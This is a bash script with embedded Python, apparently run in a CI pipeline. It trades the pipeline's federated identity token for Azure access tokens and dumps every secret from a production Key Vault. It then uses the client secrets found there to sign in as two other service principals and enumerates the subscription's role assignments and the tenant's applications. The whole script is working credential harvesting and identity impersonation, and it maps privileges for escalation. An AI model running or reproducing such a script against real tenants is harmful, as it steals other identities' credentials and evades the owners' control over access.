#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
G="https://graph.microsoft.com/v1.0"
ROLES={"8e3af657-a8ff-443c-a75c-2fe8c4bcb635":"Owner","b24988ac-6180-42a0-ab88-20f7382dd24c":"Contributor",
 "acdd72a7-3385-48ef-bd42-f606fba81ae7":"Reader","4633458b-17de-408a-b874-0445c86b69e6":"KV Secrets User",
 "b86a8fe4-44ce-4948-aee5-eccb2c155cd7":"KV Secrets Officer","21090545-7ca7-4776-b22c-e363652d74d2":"KV Reader",
 "00482a5a-887f-4fb3-b363-3b7fe8e74483":"KV Administrator","18d7d88d-d35e-4fb5-a5c3-7773c20a72d9":"User Access Admin",
 "f58310d9-a9f6-439a-9e8d-f62e7b41a168":"RBAC Administrator","7f951dda-4ed3-4680-a7ca-43fe172d538d":"AcrPull",
 "81a9662b-bebf-436f-a333-f67b29880f12":"Storage Account Key Operator",
 "ba92f5b4-2d11-453d-a403-e96b0029c9fe":"Storage Blob Data Contributor",
 "2a2b9908-6ea1-4ae2-8e65-a410df84e7d1":"Storage Blob Data Reader"}
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
ARM=oidc("https://management.azure.com/.default"); KVT=oidc("https://vault.azure.net/.default")
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def tok(c, sc):
    st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":sc,"grant_type":"client_credentials"})
    return jg(b).get("access_token")
AUD=tok(creds["directory-audit-principal"],"https://graph.microsoft.com/.default")
SYN=tok(creds["sync-service-principal"],"https://graph.microsoft.com/.default")
HA={"Authorization":"Bearer "+AUD}; HS={"Authorization":"Bearer "+SYN}

names={}
def nm(pid):
    if pid in names: return names[pid]
    st,b=http(f"{G}/directoryObjects/{pid}", headers=HA)
    d=jg(b); names[pid]=f"{d.get('displayName','?')}[{d.get('@odata.type','').split('.')[-1]}]" if st==200 else f"?({st})"
    return names[pid]

print("### ALL role assignments visible in subscription")
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/"
          f"roleAssignments?api-version=2022-04-01", headers={"Authorization":"Bearer "+ARM})
vals=jg(b).get("value",[])
print("  HTTP",st,"count",len(vals))
for ra in vals:
    p=ra["properties"]; rid=p.get("roleDefinitionId","").rsplit("/",1)[-1]
    sc=p.get("scope","")
    print(f"   {ROLES.get(rid,rid)[:26]:26} | {nm(p.get('principalId'))[:38]:38} | {sc[sc.rfind('/')+1:][:40]}")

print("\n### all applications (via Application.ReadWrite.All)")
st,b=http(f"{G}/applications?$select=" + urllib.parse.quote("id,displayName,appId"), headers=HS)
for a in jg(b).get("value",[]):
    print(f"   {a['displayName'][:40]:40} appId={a['appId']} objId={a['id']}")
PYEOF
echo "=== done ==="